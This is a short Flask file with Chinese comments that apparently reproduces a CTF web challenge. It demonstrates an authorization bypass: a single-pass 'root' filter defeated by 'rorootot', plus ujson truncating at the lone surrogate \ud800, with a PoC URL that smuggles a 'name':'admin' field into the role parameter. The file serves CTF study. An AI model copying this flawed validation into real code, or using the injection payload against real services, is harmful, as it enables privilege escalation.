# 參考: https://blog.bi0s.in/2021/08/15/Web/inCTFi21-JsonAnalyser/

# POC
# http://localhost:8888//verify_roles?role=rorootot\ud800%22,%22name%22:%22admin

from flask import Flask, request
from flask_cors import CORS
import ujson
import re


# 重點就是 \ud800~\udbff 會被 ujson truncate, 可用來 bypass
# print(ujson.loads('{"role":"root\ud800"}')) # 直接執行會出錯



app = Flask(__name__)

@app.route('/verify_roles',methods=['GET','POST'])
def verify_roles():
    role = request.args.get('role')

    # root -> "" , bypass: rorootot
    if "root" in role:
        role = role.replace("root",'')

    data = '"name":"user","role":"{0}"'.format(role)
    print(data)
    
    # role 不可以是 root, bypass: ujson 會 truncate \ud800 => root\ud800
    if re.search(r'"role":"(.*?)"',data).group(1) == "root":
        return "no2"
        
    data='{'+data+'}'
    try:
        user_data = ujson.loads(data) # truncate \ud800
        print(user_data)
    except:
        return "no3" 

    role = user_data['role']
    user = user_data['name']
    if (user == "admin" and role == "root"):
        return "Yes"
    else:
        return "no4"

if __name__=='__main__':
    app.run(host='127.0.0.1',port=8888)
